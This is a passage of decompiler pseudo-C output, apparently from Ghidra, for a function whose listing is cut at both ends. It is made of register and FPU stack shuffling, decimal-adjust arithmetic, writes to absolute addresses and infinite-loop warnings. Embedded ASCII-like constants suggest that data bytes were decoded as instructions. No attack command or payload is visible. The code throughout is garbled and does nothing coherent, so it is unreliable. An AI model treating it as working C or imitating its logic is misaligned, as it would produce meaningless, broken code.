in_ST6;\n                if (uVar132 || bVar131) goto code_r0x00441509;\ncode_r0x004414e9:\n                ppuStack192 = &stack0xffffff54;\n                unaff_ESI = unaff_EDI;\n                ppuStack44._0_2_ = ppuStack176._0_2_;\n                in_ST0 = fVar136;\n                fVar137 = in_ST2;\n                fVar135 = in_ST3;\n                fVar142 = in_ST4;\n                fVar138 = in_ST5;\n                ppuStack204 = unaff_EDI;\n                ppuStack200 = ppuVar117;\n                ppuStack196 = ppuVar113;\n                ppuStack188 = ppuVar43;\n                ppuStack184 = param_2;\n                pcStack180 = ppuVar25;\n                ppuStack176 = ppuVar12;\n                if (uVar132 || bVar131) break;\n                puVar16 = ppuVar12 + 0x76;\n                uVar132 = false;\n                *puVar16 = *puVar16 & ppuVar12 >> 8;\n                bVar131 = *puVar16 == 0;\n                ppuStack208 = ppuVar12;\n                ppuStack192 = &stack0xffffff54;\n                ppuStack184 = param_2;\n                ppuVar116 = ppuStack92;\ncode_r0x004414f1:\n                ppuStack92 = ppuVar116;\n                ppuStack232 = &stack0xffffff2c;\n                ppuStack212 = ppuStack212 & 0xffff0000 | in_CS;\n                uStack144 = SUB42(unaff_EDI, 0);\n                uStack142 = unaff_EDI >> 0x10;\n                uStack141 = uStack141 & 0xffffff00 | unaff_EDI >> 0x18;\n                ppuVar24 = ppuVar25;\n                fVar135 = in_ST1;\n                appuStack244[1] = ppuVar117;\n                appuStack244[2] = ppuVar113;\n                appuStack228[0] = ppuVar43;\n                appuStack228[1] = param_2;\n                appuStack228[2] = ppuVar25;\n                appuStack228[3] = ppuVar12;\n                if (uVar132 || bVar131) {\n                    return ppuVar12;\n                }\ncode_r0x004414f5:\n                ppuVar12 = ppuVar12 ^ 0x17007660;\n                ppuStack176 = unaff_EDI;\n                ppuStack148 = ppuVar12;\n                ppuVar116 = ppuStack92;\ncode_r0x004414fd:\n                ppuStack92 = ppuVar116;\n                ppuStack164 = &stack0xffffff70;\n                *(ppuVar12 + 0x76) = *(ppuVar12 + 0x76) | &stack0xffffff50;\n                ppuVar12 = ppuVar12 + 1;\n                in_ST0 = fVar136;\n                in_ST1 = fVar135;\n                fVar137 = in_ST2;\n                fVar142 = in_ST3;\n                fVar138 = in_ST4;\n                fVar139 = in_ST5;\n                ppuStack172 = ppuVar117;\n                ppuStack168 = ppuVar113;\n                ppuStack160 = ppuVar43;\n                ppuStack156 = param_2;\n                ppuStack152 = ppuVar24;\ncode_r0x00441501:\n                in_ST5 = in_ST6;\n                in_ST4 = fVar139;\n                in_ST3 = fVar138;\n                in_ST2 = fVar142;\n                fVar136 = in_ST1;\n                uVar122 = ppuVar12 & 0xffff0000 | CONCAT11(ppuVar12 >> 8 | *(ppuVar12 + 0x76), ppuVar12);\n                ppuVar12 = uVar122 + 1;\n                piVar123 = uVar122 + 0x77;\n                *piVar123 = &stack0xffffffb4 + *piVar123;\n                uVar132 = false;\n                uVar6 = ppuVar43 >> 8 & ppuVar43;\n                ppuVar43 = ppuVar43 & 0xffff0000 | CONCAT11(uVar6, ppuVar43);\n                bVar131 = uVar6 == 0;\n                ppuVar25 = ppuVar24;\n                unaff_ESI = ppuStack76;\n                in_ST1 = fVar136;\n                fVar135 = in_ST2;\n                fVar142 = in_ST3;\n                fVar138 = in_ST4;\n                in_ST6 = in_ST5;\n                if (bVar131) break;\n                in_ST6 = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                *(ppuStack76 + 0x76) = ROUND(in_ST0);\n                cStack104 = ppuStack76;\n                cStack103 = ppuStack76 >> 8;\n                uStack102 = ppuStack76 >> 0x10;\n                uStack101 = ppuStack76 >> 0x18;\n                ppuVar116 = ppuVar117;\n                unaff_EDI = ppuStack76;\n                in_ST0 = fVar137;\n                in_ST1 = in_ST2;\n                fVar138 = in_ST3;\n                fVar139 = in_ST4;\n                fVar140 = in_ST5;\n                ppuStack96 = ppuVar113;\n                ppuStack92 = &stack0xffffffb8;\n                ppuStack88 = ppuVar43;\n                ppuStack84 = param_2;\n                ppuStack80 = ppuVar24;\n                ppuVar44 = ppuVar12;\n                ppuStack72 = ppuVar117;\n                if (bVar131) {\n                    ppuVar25 = ppuVar24 + -1;\n                    ppuStack92 = &stack0xffffffb8;\n                    ppuVar24 = ppuVar12;\n                    if (ppuVar25 != NULL && !bVar131) {\n                        ppuVar13 = ppuVar12;\n                        fVar138 = in_ST4;\n                        fVar139 = in_ST5;\n                        ppuVar24 = ppuStack156;\n                        ppuStack92 = &stack0xffffffb8;\n                        ppuStack76 = ppuVar12;\n                        if (bVar131) goto code_r0x00441529;\n                        goto code_r0x00441519;\n                    }\n                    while (ppuStack76 = ppuVar24,  ppuVar13 = ppuVar12,  ppuVar116 = ppuVar117,  unaff_ESI = unaff_EDI, \n                          fVar135 = fVar136,  in_ST0 = fVar137,  in_ST1 = in_ST2,  fVar142 = in_ST3,  fVar138 = in_ST4, \n                          fVar139 = in_ST5,  uVar132 || bVar131) {\ncode_r0x00441519:\n                        in_ST5 = in_ST6;\n                        in_ST4 = fVar139;\n                        in_ST3 = fVar138;\n                        in_ST2 = fVar142;\n                        uVar143 = CONCAT44(param_2, ppuVar13);\n                        in_ST6 = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                        *(unaff_ESI + 0x76) = ROUND(fVar136);\n                        *ppuVar43 = *ppuVar43;\n                        fVar136 = in_ST0;\n                        fVar137 = in_ST1;\n                        puVar114 = puStack60;\n                        if (!uVar132 && !bVar131) goto code_r0x00441521;\ncode_r0x004414b1:\n                        ppuVar113 = CONCAT13(uStack109, uStack113._1_3_);\n                        *(unaff_ESI + 4) = *(unaff_ESI + 4);\n                        unaff_EDI = CONCAT13(uStack105, CONCAT21(uStack107, uStack108));\n                        ppuVar12 = ppuVar13;\n                        ppuVar117 = ppuVar116;\n                        ppuVar24 = ppuStack76;\n                    }\n                    goto code_r0x004414b9;\n                }\n                while( true ) {\n                    ppuStack76 = ppuVar44;\n                    in_ST5 = in_ST6;\n                    in_ST4 = fVar140;\n                    in_ST3 = fVar139;\n                    in_ST2 = fVar138;\n                    uVar143 = CONCAT44(param_2, ppuVar12);\n                    in_ST6 = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                    *(unaff_EDI + 0x76) = ROUND(fVar136);\n                    uVar7 = ppuVar43;\n                    uVar8 = ppuVar43 >> 8;\n                    uVar6 = uVar8 + uVar7;\n                    cVar49 = uVar6 + uVar132;\n                    ppuVar43 = ppuVar43 & 0xffff0000 | CONCAT11(cVar49, uVar7);\n                    unaff_ESI = CONCAT13(uStack101, CONCAT12(uStack102, CONCAT11(cStack103, cStack104)));\n                    puVar114 = puStack60;\n                    if ((CARRY1(uVar8, uVar7) || CARRY1(uVar6, uVar132)) || cVar49 == '\\0') break;\ncode_r0x00441521:\n                    puStack60 = puVar114;\n                    param_2 = uVar143 >> 0x20;\n                    puVar26 = uVar143 + 0x76;\n                    uVar132 = false;\n                    *puVar26 = *puVar26 & &stack0xffffffb8;\n                    bVar131 = *puVar26 == 0;\n                    ppuVar117 = ppuVar116;\n                    unaff_EDI = unaff_ESI;\n                    fVar136 = in_ST0;\n                    fVar137 = in_ST1;\n                    ppuVar24 = ppuStack156;\ncode_r0x00441529:\n                    while( true ) {\n                        ppuStack156 = ppuVar24;\n                        fVar135 = fVar137;\n                        uStack52 = uVar144 >> 0x20;\n                        ppuStack92 = &stack0xffffffb8;\n                        uVar141 = SUB108(in_ST6, 0);\n                        ppuVar12 = 0x1f9077c1;\n                        ppuStack76 = 0x1f9077c1;\n                        uStack125._1_3_ = Var3 + -0x68;\n                        cStack104 = unaff_EDI;\n                        uVar1 = cStack104;\n                        cStack103 = unaff_EDI >> 8;\n                        uVar5 = cStack103;\n                        uStack102 = unaff_EDI >> 0x10;\n                        uStack101 = unaff_EDI >> 0x18;\n                        in_ST0 = fVar135;\n                        in_ST1 = in_ST2;\n                        fVar138 = in_ST3;\n                        fVar139 = in_ST4;\n                        fVar140 = in_ST5;\n                        ppuStack100 = ppuVar117;\n                        ppuStack96 = ppuVar113;\n                        ppuVar116 = &stack0xffffffb8;\n                        ppuStack88 = ppuVar43;\n                        ppuStack84 = param_2;\n                        ppuStack80 = ppuVar25;\n                        if (uVar132 || bVar131) break;\n                        uVar6 = in_AF * -6 - 0x3f;\n                        uVar132 = 0x9f < uVar6 | uVar132 | in_AF * (uVar6 < 6);\n                        uStack108 = uVar6 + uVar132 * -0x60;\n                        uVar143 = CONCAT44(param_2, CONCAT31(0x1f9077, uStack108));\n                        uStack107 = 0x9077;\n                        uStack105 = 0x1f;\n                        uStack113._1_3_ = SUB43(ppuVar25, 0);\n                        uStack109 = ppuVar25 >> 0x18;\n                        uStack117._1_3_ = SUB43(param_2, 0);\n                        uStack113._0_1_ = param_2 >> 0x18;\n                        uStack121._1_3_ = SUB43(ppuVar43, 0);\n                        uStack117._0_1_ = ppuVar43 >> 0x18;\n                        uStack121._0_1_ = &stack0xffffff98 >> 0x18;\n                        uStack129._1_3_ = SUB43(ppuVar113, 0);\n                        uStack125._0_1_ = ppuVar113 >> 0x18;\n                        uStack133 = uStack133 & 0xff | ppuVar117 << 8;\n                        uStack129._0_1_ = ppuVar117 >> 0x18;\n                        in_ST0 = fVar136;\n                        in_ST1 = fVar135;\n                        ppuVar116 = &stack0xffffffb8;\n                        unaff_ESI = unaff_EDI;\n                        if (uVar132 || bVar131) goto code_r0x004414c5;\n                        ppuStack164 = &stack0xffffff70;\n                        ppuVar12 = 0x1f907738;\n                        ppuStack148 = 0x1f907738;\n                        ppuVar24 = ppuVar25;\n                        ppuStack176 = unaff_EDI;\n                        ppuVar116 = &stack0xffffffb8;\n                        unaff_EBX = unaff_EDI;\n                        if (*0x10 == 0x90) goto code_r0x004414fd;\n                        ppuVar12 = CONCAT31(0x1f9077, *0xc0766032) ^ 0x60;\n                        fVar142 = in_ST6;\n                        if (*0xc0766032 == '`') goto code_r0x00441599;\n                        uVar132 = false;\n                        ppuVar12 = CONCAT31(0x1f9077, *0xc0766032) ^ 0xe307600;\n                        bVar131 = ppuVar12 == NULL;\n                        ppuStack208 = unaff_EDI;\n                        ppuStack204 = ppuVar117;\n                        ppuStack200 = ppuVar113;\n                        ppuStack196 = &stack0xffffff50;\n                        ppuStack192 = ppuVar43;\n                        ppuStack188 = param_2;\n                        ppuStack184 = ppuVar25;\n                        pcStack180 = ppuVar12;\n                        ppuVar116 = &stack0xffffffb8;\n                        if (bVar131) goto code_r0x004414f1;\n                        bVar131 = &stack0xffffff30 < *(ppuVar12 + 0x76);\n                        puVar114 = *(ppuVar12 + 0x76);\n                        iVar23 = -puVar114;\n                        LOCK();\n                        ppuStack196 = &stack0xffffff50;\n                        ppuStack172 = ppuVar117;\n                        ppuStack168 = ppuVar113;\n                        ppuStack160 = ppuVar43;\n                        ppuStack156 = param_2;\n                        ppuStack152 = ppuVar25;\n                        *(&stack0xffffff2c + iVar23) = in_DS;\n                        *(&stack0xffffff28 + iVar23) = ppuVar12;\n                        *(&stack0xffffff24 + iVar23) = ppuVar25;\n                        *(&stack0xffffff20 + iVar23) = param_2;\n                        *(&stack0xffffff1c + iVar23) = ppuVar43;\n                        *(&stack0xffffff18 + iVar23) = &stack0xffffff2c + iVar23;\n                        *(&stack0xffffff14 + iVar23) = ppuVar113;\n                        *(&stack0xffffff10 + iVar23) = ppuVar117;\n                        *(&stack0xffffff0c + iVar23) = unaff_EDI;\n                        if (bVar131 || &stack0xffffff30 == puVar114) goto code_r0x00441599;\n                        fVar142 = CONCAT28(in_MM7_Wd, CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7)));\n                        *(unaff_EDI + 0x76) = ROUND(fVar136);\n                        uVar122 = ppuVar12 & 0xffffff00 | *0x90766023;\n                        *(&stack0xffffff08 + iVar23) = uVar122;\n                        *(&stack0xffffff04 + iVar23) = ppuVar25;\n                        *(&stack0xffffff00 + iVar23) = param_2;\n                        *(&stack0xfffffefc + iVar23) = ppuVar43;\n                        *(&stack0xfffffef8 + iVar23) = &stack0xffffff0c + iVar23;\n                        *(&stack0xfffffef4 + iVar23) = ppuVar113;\n                        *(&stack0xfffffef0 + iVar23) = ppuVar117;\n                        if (bVar131 || &stack0xffffff30 == puVar114) {\n                            do {\n    // WARNING: Do nothing block with infinite loop\n                            } while( true );\n                        }\n                        uVar132 = false;\n                        ppuVar116 = uVar122 | 0x60;\n                        bVar131 = (*0x90766023 | 0x60) == 0;\n                        in_ST1 = in_ST2;\n                        fVar137 = in_ST3;\n                        fVar138 = in_ST4;\n                        fVar139 = in_ST5;\n                        fVar140 = in_ST6;\n                        if (bVar131) {\ncode_r0x00441509:\n                            in_ST6 = fVar142;\n                            in_ST5 = fVar140;\n                            in_ST4 = fVar139;\n                            in_ST3 = fVar138;\n                            in_ST2 = fVar137;\n                            fVar136 = in_ST1;\n                            uVar141 = CONCAT26(in_MM7_Wc, CONCAT24(in_MM7_Wb, in_ST7));\n                            fVar142 = CONCAT28(in_MM7_Wd, uVar141);\n                            *(unaff_EDI + 0x76) = ROUND(fVar135);\n                            ppuVar12 = CONCAT31(ppuVar116 >> 8, 0xdf);\n                            unaff_EDI = ppuStack176;\n                            in_ST0 = in_ST2;\n                            in_ST1 = in_ST3;\n                            fVar138 = in_ST4;\n                            fVar139 = in_ST5;\n                            fVar140 = in_ST6;\n                            ppuVar116 = ppuStack92;\n                            if (!uVar132 && !bVar131) break;\n                        }\n                        else {\n                            *(&stack0xfffffee8 + iVar23) = in_ES;\n                            *(&stack0xfffffee4 + iVar23) = ppuVar116;\n                            *(&stack0xfffffee0 + iVar23) = ppuVar25;\n                            *(&stack0xfffffedc + iVar23) = param_2;\n                            *(&stack0xfffffed8 + iVar23) = ppuVar43;\n                            *(&stack0xfffffed4 + iVar23) = &stack0xfffffee8 + iVar23;\n                            *(&stack0xfffffed0 + iVar23) = ppuVar113;\n                            *(&stack0xfffffecc + iVar23) = ppuVar117;\n                            *ppuVar116 = *ppuVar116 + (*0x90766023 | 0x60);\n                            ppuVar24 = ppuVar116 + -6;\n                            uVar132 = *ppuVar24;\n                            uVar6 = (ppuVar12 & 0xffffff00) >> 8;\n                            *ppuVar24 = *ppuVar24 + uVar6;\n                            cVar49 = param_2 >> 8;\n                            uVar122 = CONCAT11(cVar49 + CARRY1(uVar132, uVar6), param_2);\n                            param_2 = param_2 & 0xffff0000 | uVar122;\n                            pcVar15 = ppuVar12 & 0xffff0000 | ppuVar116 + uVar6 * 'v';\n                            if (SCARRY1(cVar49, '\\0') != SCARRY1(cVar49, CARRY1(uVar132, uVar6))) {\n                                *pcVar15 = *pcVar15 + (uVar122 >> 8);\n                                do {\n    // WARNING: Do nothing block with infinite loop\n                                } while( true );\n                            }\n                            ppuVar12 = ppuVar12 & 0xffff0000 | *0x76d5f6;\n                            fVar136 = fVar135;\n                            cStack104 = uVar1;\n                            cStack103 = uVar5;\n                        }\n                        uVar132 = ppuVar12;\n                        *ppuVar12 = *ppuVar12 + uVar132;\n                        *(ppuVar12 + 3) = *(ppuVar12 + 3) + param_2;\n                        in_ES = CONCAT11(cStack103, cStack104);\n                        *ppuVar12 = *ppuVar12 + uVar132;\n                        pcVar15 = ppuVar12 + -0x37;\n                        *pcVar15 = *pcVar15 + (param_2 >> 8);\n                        if ((POPCOUNT(*pcVar15) & 1U) == 0) {\n                            *ppuVar12 = *ppuVar12 + uVar132;\n                            *ppuVar12 = *ppuVar12 + uVar132;\ncode_r0x0044160a:\n                            *ppuVar12 = *ppuVar12 + uVar132;\n                            *ppuVar12 = *ppuVar12 + uVar132;\n                            *ppuVar12 = *ppuVar12 + uVar132;\n                            uStack107 = SUB42(ppuVar12, 0);\n                            uStack105 = ppuVar12 >> 0x10;\n                            uVar122 = CONCAT13(uStack105, CONCAT21(uStack107, uStack108));\n                            pcVar15 = ppuVar12 + ppuVar113 * 2 + 0x65;\n                            *pcVar15 = *pcVar15 + param_2;\n                            puVar16 = ppuVar12 + 0x6f;\n                            *puVar16 = *puVar16 & uStack108;\n                            if (*puVar16 == 0) {\n                                *param_2 = *param_2 & ppuVar12;\n                                ppuVar116 = unaff_EDI;\ncode_r0x00441687:\n                                uVar38 = uVar122 & 0xffff0000 | CONCAT11((uVar122 >> 8) - *ppuVar116, uVar122);\n                                pcVar15 = ppuVar12 & 0x39;\n                                pcVar15[0x47] = pcVar15[0x47] + uVar122;\n                                param_2 = param_2 + -1;\n                                ppuVar113 = ppuVar113 + -2;\n                                *0x55494b34 = *0x55494b34 ^ ppuVar117;\n                                uVar132 = pcVar15;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                *pcVar15 = *pcVar15 + uVar132;\n                                in_AF = 9 < ((uVar132 | 0x2c) & 0xf) | in_AF;\n                                uVar132 = (uVar132 | 0x2c) + in_AF * '\\x06';\n                                ppuVar12 = uVar132 + (0x90 < (uVar132 & 0xf0) | in_AF * (0xf9 < uVar132)) * '`' + 0x4b;\n                            }\n                            else {\n                                ppuVar116 = unaff_EDI + 1;\n                                uVar1 = in(param_2);\n                                *unaff_EDI = uVar1;\n                                ppuVar24 = ppuVar113 + 0x19;\n                                *ppuVar24 = *ppuVar24 & uVar132;\n                                if (*ppuVar24 != '\\0') goto code_r0x00441687;\n                                *(ppuVar113 + 0x61) = *(ppuVar113 + 0x61) & uStack108;\n                                ppuVar113 = ppuVar117[8] * 0x20646e61;\n                                ppuVar12 = ppuVar12 ^ 0x74;\n                                if (uVar132 != 0x74) {\n                                    *(uVar122 + 0x6e) = *(uVar122 + 0x6e) & uVar132;\n                                    *(ppuVar12 + 0x69) = *(ppuVar12 + 0x69) & uStack108;\n                                    puVar124 = segment(ppuStack44._0_2_, *0x10 + -0x68);\n                                    *puVar124 = 0x646e616c;\n                                    ppuVar43 = ppuVar43 + -1;\n                                    uVar122 = uVar122 - 1;\n                                    goto code_r0x00441687;\n                                }\n                                uVar38 = uVar122 + 1;\n                            }\n                            cStack104 = -100;\n                            cStack103 = &stack0xffffff9c >> 8;\n                            uStack102 = &stack0xffffff9c >> 0x10;\n                            uStack101 = &stack0xffffff9c >> 0x18;\n                            pcVar15 = ppuVar12 & 0x123d;\n                            *pcVar15 = *pcVar15 + pcVar15;\n                            puVar26 = uVar38 - 1;\n                            puVar16 = pcVar15 ^ 0x535848;\n                            uVar7 = puVar16;\n                            *puVar16 = *puVar16 + uVar7;\n                            uVar132 = puVar26 >> 8;\n                            bVar131 = CARRY1(*0x32553728, uVar132);\n                            *0x32553728 = *0x32553728 + uVar132;\n                            uVar8 = puVar16 >> 8;\n                            uVar132 = uVar8 - *puVar16;\n                            uVar122 = CONCAT22(0x53, CONCAT11(uVar132 - bVar131, uVar7));\n                            uVar6 = 9 < (uVar7 & 0xf) | in_AF;\n                            uVar7 = uVar7 + uVar6 * -6;\n                            uVar7 = uVar7 + (0x9f < uVar7 |\n                                            (uVar8 < *puVar16 || uVar132 < bVar131) | uVar6 * (uVar7 < 6)) * -0x60;\n                            uVar7 = uVar7 - *(uVar122 & 0xffffff00 | uVar7);\n                            pcVar15 = uVar122 & 0xffffff00 | uVar7;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            uVar8 = puVar26;\n                            (&stack0xffffffdd)[puVar26 * 2] = (&stack0xffffffdd)[puVar26 * 2] + uVar8;\n                            uVar122 = uVar122 & 0xffffff00 | uVar7;\n                            pcVar15 = uVar122 ^ 0x44345277;\n                            ppuVar12 = ppuVar117 + 1;\n                            uVar132 = pcVar15;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            if (*pcVar15 != '\\0') {\n                                *(param_2 + 0x5f) = *(param_2 + 0x5f) + ppuVar43;\n                                uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                                pcVar15 = (pcVar15 & 0xffff0000 |\n                                          CONCAT11((pcVar15 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f) +\n                                          0xa3abe6bf;\n                                cStack104 = pcVar15;\n                                cStack103 = pcVar15 >> 8;\n                                uStack102 = pcVar15 >> 0x10;\n                                uStack101 = pcVar15 >> 0x18;\n                                *pcVar15 = *pcVar15 + cStack104;\n                                uVar132 = param_2 + 1 >> 8;\n                                *ppuVar43 = *ppuVar43 + uVar132;\n                                pcVar15 = (pcVar15 ^ 0x324b4733) - 1;\n                                *0x37 = *0x37 ^ ppuVar117 + 2;\n                                *(ppuVar113 + 0xe) = *(ppuVar113 + 0xe) + (uVar132 ^ *(ppuVar116 + 0x35) >> 8);\n                                ppuVar12 = ppuVar117 + 2;\ncode_r0x0044170a:\n                                ppuVar43 = ppuVar12;\n                                uVar122 = (pcVar15 ^ 0x51) & 0x14;\n                                pcVar45 = pcVar15 & 0xffffff00 | uVar122;\n                                pcVar18 = CONCAT13(uStack101, CONCAT12(uStack102, CONCAT11(cStack103, cStack104)));\n                                uVar7 = uVar122;\n                                *pcVar45 = *pcVar45 + uVar7;\n                                pcVar45[0x55] = pcVar45[0x55] ^ uVar8;\n                                uVar122 = ppuVar116 ^ *puVar26;\n                                puVar16 = ppuVar43 + 0x39;\n                                uVar132 = *puVar16;\n                                uVar9 = ppuVar43;\n                                *puVar16 = *puVar16 + uVar9;\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                uVar7 = uVar7 + uVar6 * '\\x06';\n                                pcVar15 = (pcVar15 & 0xffffff00 |\n                                          (uVar7 + (0x90 < (uVar7 & 0xf0) |\n                                                   CARRY1(uVar132, uVar9) | uVar6 * (0xf9 < uVar7)) * '`') - 0x3f) ^\n                                          0x1a3b;\n                                *pcVar18 = *pcVar18 + cStack103;\n                                uVar7 = pcVar15;\n                                *pcVar15 = *pcVar15 + uVar7;\n                                puVar16 = ppuVar43 + 0x33;\n                                uVar132 = *puVar16;\n                                uVar10 = pcVar15 >> 8;\n                                *puVar16 = *puVar16 + uVar10;\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                uVar7 = uVar7 + uVar6 * '\\x06';\n                                uVar132 = 0x90 < (uVar7 & 0xf0) | CARRY1(uVar132, uVar10) | uVar6 * (0xf9 < uVar7);\n                                uVar7 = uVar7 + uVar132 * '`';\n                                ppuVar116 = uVar122 + 1;\n                                uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                                uVar7 = uVar7 + uVar6 * '\\x06';\n                                puVar16 = pcVar15 & 0xffffff00 |\n                                          uVar7 + (0x90 < (uVar7 & 0xf0) | uVar132 | uVar6 * (0xf9 < uVar7)) * '`';\n                                ppuVar12 = ppuVar43;\n                                if (ppuVar116 != NULL && SCARRY4(uVar122, 1) == ppuVar116 < 0) {\n                                    *ppuVar113 = *ppuVar113 & pcVar18 + -1;\n                                    pcVar18[0x34] = pcVar18[0x34] ^ uVar9;\n                                    puVar26 = puVar26 & 0xffffff00 | uVar8 ^ *(uVar122 + 0x4c);\n                                    ppuVar24 = pcVar18 + -1;\n                                    goto code_r0x0044174b;\n                                }\n                            }\n                            else {\n                                if (*pcVar15 == '\\0') goto code_r0x0044170a;\n                                *pcVar15 = *pcVar15 + (param_2 >> 8);\n                                puVar16 = uVar122 ^ 0xf7b6024;\n                                ppuVar24 = ppuVar113;\ncode_r0x0044174b:\n                                uVar132 = puVar16;\n                                *puVar16 = *puVar16 ^ uVar132;\n                                *ppuVar116 = *ppuVar116;\n                                *ppuVar24 = *ppuVar24 - (puVar16 >> 8);\n                                uVar122 = puVar26 + 1;\n                                puVar16 = puVar16 & 0xffffff00 | uVar132 - 0x26;\n                                puVar26 = uVar122 & 0xffff0000 |\n                                          CONCAT11((uVar122 >> 8) + *0x505b21 + (uVar132 < 0x26), uVar122);\n                                *puVar16 = *puVar16 + (uVar132 - 0x26);\n                                *0x34565a56 = *0x34565a56 + (ppuVar24 >> 8);\n                                ppuVar113 = ppuVar113 + -1;\n                            }\n                            puVar36 = puVar16 ^ 0x33;\n                            uVar7 = puVar36;\n                            *puVar36 = *puVar36 + uVar7;\n                            uVar132 = *puVar36;\n                            *puVar36 = *puVar36 + uVar7;\n                            *(puVar26 + 0x36) = *(puVar26 + 0x36) + ppuVar43 + CARRY1(uVar132, uVar7);\n                            uVar8 = ppuVar43 >> 8;\n                            uVar132 = uVar8 < *puVar36;\n                            if (uVar132 || uVar8 == *puVar36) {\n                                uVar132 = 9 < (uVar7 & 0xf) | uVar6;\n                                puVar36 = puVar16 & 0xffff0000 |\n                                          CONCAT11((puVar16 >> 8) + uVar132, uVar7 + uVar132 * '\\x06') & 0xff0f;\n                                ppuVar12 = ppuVar12 + 1;\n                                uVar6 = uVar132;\n                            }\n                            *puVar36 = (*puVar36 - uVar8) - uVar132;\n                            uVar132 = puVar36;\n                            *puVar36 = *puVar36 + uVar132;\n                            *(ppuVar116 + 0x49) = *(ppuVar116 + 0x49) ^ uVar132;\n                            uVar27 = puVar26 + 1U ^ ppuVar116[0xc];\n                            *puVar36 = *puVar36 + uVar132;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar122 = (CONCAT11((puVar36 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f) & 0x3a23132e\n                            ;\n                            uVar132 = uVar122;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar122 >> 8) + uVar6, uVar132 + uVar6 * '\\x06') & 0xff0f;\n                            uVar132 = uVar11;\n                            uVar6 = 9 < uVar132 | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) - uVar6, uVar132 + uVar6 * -6) & 0xff0f;\n                            pcVar15 = puVar36 & 0x3a230000 | uVar11;\n                            Var2 = Var3 - 0x80;\n                            uVar132 = uVar11;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(ppuVar116 + ppuVar12 + 0x12) = *(ppuVar116 + ppuVar12 + 0x12) + uVar132;\n                            puVar19 = &stack0xffffff80 & 0xff000000 | Var2;\n                            uStack141 = uStack141 & 0xff | &stack0xffffff80 * 0x100;\n                            uVar6 = 9 < ((uVar132 ^ 0x52) & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar11 >> 8) + uVar6, (uVar132 ^ 0x52) + uVar6 * '\\x06') & 0xff0f;\n                            pcVar15 = puVar36 & 0x3a230000 | uVar11;\n                            *pcVar15 = *pcVar15 + uVar11;\n                            *puVar19 = *puVar19 + uVar27;\n                            uVar122 = (pcVar15 ^ 0x27) + 1;\n                            *puVar19 = *puVar19 - (ppuVar43 + 1 >> 8);\n                            uVar6 = 9 < (uVar122 & 0xf) | uVar6;\n                            uVar50 = &stack0xffffff77 & *puVar19;\n                            uVar17 = (uVar122 & 0xffff0000 |\n                                     CONCAT11((uVar122 >> 8) - uVar6, uVar122 + uVar6 * -6) & 0xff0f) ^ 0x48;\n                            uVar122 = uVar17 - 1;\n                            *(uVar50 - 5) = uVar122;\n                            ppuVar43 = ppuVar116 + 1;\n                            cVar49 = Var2 >> 8;\n                            *(ppuVar116 + 0x31) = *(ppuVar116 + 0x31) + cVar49;\n                            puVar114 = ppuVar113 + 3;\n                            uVar17 = uVar17 + 0x543d434a;\n                            *(uVar50 - 9) = puVar114;\n                            uVar132 = (uVar17 + -0x59) - (0xabc2bcb4 < uVar122);\n                            uVar38 = uVar17 & 0xffffff00;\n                            puVar28 = uVar38 | uVar132;\n                            uVar118 = *(uVar50 - 9);\n                            *(uVar50 - 9) = puVar114;\n                            *puVar28 = *puVar28 + uVar132;\n                            *puVar28 = *puVar28 + cVar49;\n                            *(uVar50 - 0xd) = puVar114;\n                            puVar26 = uVar118 + 0x32;\n                            *puVar26 = *puVar26 ^ puVar19;\n                            *(uVar27 + 0x31) = *(uVar27 + 0x31) ^ uVar27;\n                            uVar122 = *puVar28;\n                            *puVar28 = *puVar28 + uVar132;\n                            *puVar19 = *puVar19 + uVar132;\n                            uVar132 = uVar132 - 0x24;\n                            pcVar15 = uVar38 | uVar132;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            *(uVar27 + 0x5a) = *(uVar27 + 0x5a) + Var2;\n                            pcVar45 = uStack141 - 1;\n                            puVar16 = uVar27 - 1;\n                            *(uVar50 - 0x11) = uVar50 - 0xd;\n                            *pcVar15 = *pcVar15 + uVar132;\n                            uVar8 = puVar16;\n                            *pcVar45 = *pcVar45 + uVar8;\n                            *(uVar50 - 0x15) = puVar114;\n                            uVar6 = 9 < (uVar132 & 0xf) | uVar6;\n                            uVar11 = CONCAT11((uVar38 >> 8) - uVar6, uVar132 + uVar6 * -6) & 0xff0f;\n                            uVar17 = uVar17 & 0xffff0000;\n                            uVar38 = uVar11;\n                            puVar26 = (uVar118 ^ uVar122) + *((uVar17 | uVar38) + pcVar45 * 2) + uVar6;\n                            iVar115 = *(uVar50 - 0x15);\n                            uVar7 = uVar11;\n                            uVar6 = 9 < uVar7 | uVar6;\n                            uVar7 = uVar7 + uVar6 * -6;\n                            uVar132 = 0x9f < uVar7 | *ppuVar43 < puVar16 | uVar6 * (uVar7 < 6);\n                            uVar7 = uVar7 + uVar132 * -0x60;\n                            uVar6 = 9 < (uVar7 & 0xf) | uVar6;\n                            uVar7 = uVar7 + uVar6 * '\\x06';\n                            uVar7 = uVar7 + (0x90 < (uVar7 & 0xf0) | uVar132 | uVar6 * (0xf9 < uVar7)) * '`';\n                            pcVar15 = uVar17 | uVar38 & 0xffffff00 | uVar7;\n                            *(uVar50 - 0x15) = puVar26;\n                            *puVar16 = *puVar16 ^ pcVar45 >> 8;\n                            *pcVar15 = *pcVar15 + uVar7;\n                            *(uStack141 + 0x42) = *(uStack141 + 0x42) ^ uVar8;\n                            uVar6 = 9 < 